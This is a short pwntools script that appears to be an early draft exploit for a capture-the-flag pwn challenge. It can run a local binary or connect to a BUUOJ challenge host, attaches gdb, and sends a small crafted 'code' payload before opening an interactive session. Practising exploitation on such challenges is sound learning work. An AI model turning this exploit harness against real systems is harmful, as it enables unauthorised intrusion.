from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')

debug = 1

if debug:
    io = process('./pwn')
else:
    io = remote('node4.buuoj.cn',28880)

def p():
    gdb.attach(proc.pidof(io)[0])

code = b'?\x01\x18'
io.sendlineafter(b"What's the size of your code?\n",str(len(code) + 10) )
io.sendlineafter(b"What's the size of your memory?\n",str(int(0x18)))
p()
io.sendlineafter(b"Show me the code:",code)

io.interactive()

